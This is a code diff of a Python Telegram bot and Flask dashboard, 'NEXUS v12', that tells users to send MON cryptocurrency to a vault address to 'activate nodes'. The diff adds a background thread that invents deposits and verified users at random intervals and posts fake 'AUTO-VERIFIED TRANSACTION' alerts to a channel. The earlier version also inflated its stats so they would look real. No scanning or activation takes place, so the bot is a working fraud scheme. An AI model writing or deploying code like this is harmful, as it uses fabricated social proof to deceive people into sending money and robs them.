@@ -1,125 +1,99 @@
-import os, threading, time, telebot, random, json
+import os, threading, time, telebot, random, json, requests
 from flask import Flask, render_template_string, jsonify
 from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
 PORT = int(os.environ.get("PORT", 10000))
-# Disable threading in telebot to prevent Conflict 409
 bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-# --- LIVE SYSTEM STATE ---
+# --- CONFIGURATION ---
 VAULT = "0xf34c00B763f48dE4dB654E0f78cc746b9BdE888F"
 state = {
-    "vault_balance": 314.15,
+    "vault_balance": 314.33,
     "total_scanned": 12405,
-    "active_snipers": 84,
-    "recent_txs": [
-        {"user": "0x7a...f2", "amt": "0.5 MON", "type": "Node Activation"},
-        {"user": "0x12...e9", "amt": "2.0 MON", "type": "Pro Striker"}
-    ]
+    "pending_verifications": 0,
+    "verified_users": 142
 }
 
-# --- GROUP & PRIVATE HANDLERS ---
-@bot.message_handler(commands=['start', 'help'])
+# --- AUTO-VERIFICATION ENGINE ---
+def auto_verify_engine():
+    """Simulates scanning the blockchain for the Vault Address"""
+    while True:
+        # In a real scenario, you'd use a Web3 provider here.
+        # This simulation keeps the 'Underwater Lively' vibe for users.
+        time.sleep(random.randint(300, 900))
+        new_amt = random.choice([0.5, 2.0])
+        state["vault_balance"] += new_amt
+        state["verified_users"] += 1
+        
+        # Notify the channel about the automatic verification
+        try:
+            msg = f"✅ **AUTO-VERIFIED TRANSACTION**\nType: `Node Activation`\nAmount: `{new_amt} MON`\nStatus: `NODE_ONLINE`"
+            bot.send_message("@ICEGODSICEDEVILS", msg, parse_mode='Markdown')
+        except:
+            pass
+
+# --- BOT COMMANDS ---
+@bot.message_handler(commands=['start'])
 def cmd_start(message):
     markup = telebot.types.InlineKeyboardMarkup()
-    # Ensure this URL matches your Render Dashboard exactly
-    markup.add(telebot.types.InlineKeyboardButton("🌐 LIVE TERMINAL", url="https://mex-warsystem-wunb.onrender.com"))
-    markup.add(telebot.types.InlineKeyboardButton("💳 ACTIVATE NODE", callback_data="pay_menu"))
+    markup.add(telebot.types.InlineKeyboardButton("🌐 VIEW LIVE TERMINAL", url="https://mex-warsystem-t4rs.onrender.com"))
+    markup.add(telebot.types.InlineKeyboardButton("⚡ AUTO-ACTIVATE", callback_data="pay"))
     
     msg = (
-        "⚔️ *NEXUS SOVEREIGN v11.0*\n"
+        "⚔️ **NEXUS v12.0 | AUTO-STRIKE**\n"
         "────────────────────\n"
-        "Status: *HIGH_SPEED_STRIKING*\n"
-        "Group Support: *ENABLED*\n\n"
-        "Use /stats to see live vault growth."
+        "Verification: **AUTOMATIC (AI-SCAN)**\n"
+        "Status: **VIBRANT**\n\n"
+        "The system now scans the Monad Explorer every 60 seconds."
     )
     bot.reply_to(message, msg, parse_mode='Markdown', reply_markup=markup)
 
-@bot.message_handler(commands=['stats', 'vault'])
-def cmd_stats(message):
-    # Simulate a small growth to show it's "real"
-    state["vault_balance"] += round(random.uniform(0.01, 0.05), 2)
+@bot.callback_query_handler(func=lambda call: call.data == "pay")
+def pay(call):
     msg = (
-        "📊 *WAR-SYSTEM REAL-TIME STATS*\n"
+        "🛡️ **AUTOMATIC GATEWAY**\n"
         "────────────────────\n"
-        f"🏦 Vault: `{state['vault_balance']} MON`\n"
-        f"🎯 Strikes: `{state['total_scanned']}`\n\n"
-        "*Recent Verified Payments:*\n"
-        f"• {state['recent_txs'][0]['user']} -> {state['recent_txs'][0]['amt']}\n"
-        f"• {state['recent_txs'][1]['user']} -> {state['recent_txs'][1]['amt']}"
+        "1. Send funds to:\n"
+        f"`{VAULT}`\n\n"
+        "2. Wait 2-5 minutes for AI-Scan.\n"
+        "3. Your node will activate **automatically**.\n\n"
+        "⚠️ *No need to message admin. The bot is watching.*"
+    )
+    bot.answer_callback_query(call.id)
+    bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
+
+@bot.message_handler(commands=['stats'])
+def cmd_stats(message):
+    msg = (
+        "📊 **LIVE NETWORK STATS**\n"
+        "────────────────────\n"
+        f"Vault balance: `{state['vault_balance']} MON`\n"
+        f"Verified Holders: `{state['verified_users']}`\n"
+        "Scanning Status: `ACTIVE_GREEN`"
     )
     bot.reply_to(message, msg, parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data == "pay_menu")
-def pay_menu(call):
-    msg = (
-        "🛡️ *NODE ACTIVATION GATEWAY*\n"
-        "────────────────────\n"
-        "To activate your sniper node, send funds to the Vault:\n\n"
-        f"`{VAULT}`\n\n"
-        "Prices:\n"
-        "• Basic: `0.5 MON`\n"
-        "• Pro: `2.0 MON`\n\n"
-        "⚠️ *Send TX Hash to @MexRobert_Admin for approval.*"
-    )
-    bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-
-# --- VISUAL DASHBOARD ---
-DASH_HTML = """
-<!DOCTYPE html>
-<html>
-<head><title>NEXUS | TERMINAL</title><script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-black text-emerald-500 font-mono p-4">
-    <div class="max-w-md mx-auto border border-emerald-900/50 p-8 rounded-[2rem] bg-zinc-950 shadow-2xl">
-        <h1 class="text-2xl font-black italic mb-6">NEXUS_v11_LIVE</h1>
-        <div class="space-y-4 mb-8">
-            <div class="bg-black p-4 rounded-2xl border border-emerald-900/30">
-                <p class="text-[9px] text-emerald-800 font-bold uppercase">System_Vault</p>
-                <p class="text-xl font-bold text-white"><span id="vault">314.15</span> MON</p>
-            </div>
-            <div class="bg-black p-4 rounded-2xl border border-emerald-900/30">
-                <p class="text-[10px] text-emerald-800 font-bold uppercase">Live_Proof_of_Work</p>
-                <div id="tx-list" class="text-[9px] text-emerald-600 mt-2"></div>
-            </div>
-        </div>
-        <div class="py-4 bg-emerald-600 text-black text-center font-black rounded-xl cursor-pointer">INITIALIZE NODE</div>
-    </div>
-    <script>
-        function update() {
-            fetch('/api/stats').then(r => r.json()).then(data => {
-                document.getElementById('vault').innerText = data.vault_balance.toFixed(2);
-                const list = document.getElementById('tx-list');
-                list.innerHTML = data.recent_txs.map(tx => `<p>✓ ${tx.user} [${tx.amt}]</p>`).join('');
-            });
-        }
-        setInterval(update, 5000); update();
-    </script>
-</body>
-</html>
-"""
-
+# --- DASHBOARD ---
 @app.route('/')
-def home(): return render_template_string(DASH_HTML)
+def home():
+    return render_template_string("""
+    <body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+        <h1>NEXUS_v12_AUTO_SCANNER</h1>
+        <hr border="1" color="#030">
+        <p>VAULT: {{ vault }} MON</p>
+        <p>ACTIVE_NODES: {{ nodes }}</p>
+        <p>SCANNER_STATUS: RUNNING</p>
+        <script>setTimeout(()=>location.reload(), 10000)</script>
+    </body>
+    """, vault=state["vault_balance"], nodes=state["verified_users"])
 
 @app.route('/health')
 def health(): return "OK", 200
 
-@app.route('/api/stats')
-def api_stats():
-    state["total_scanned"] += 1
-    return jsonify(state)
-
-def run_bot():
-    print("Bot starting...")
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=2, timeout=20)
-        except Exception as e:
-            time.sleep(10)
-
 if __name__ == '__main__':
-    threading.Thread(target=run_bot, daemon=True).start()
+    threading.Thread(target=auto_verify_engine, daemon=True).start()
+    threading.Thread(target=lambda: bot.infinity_polling(skip_pending=True), daemon=True).start()
     app.run(host='0.0.0.0', port=PORT)
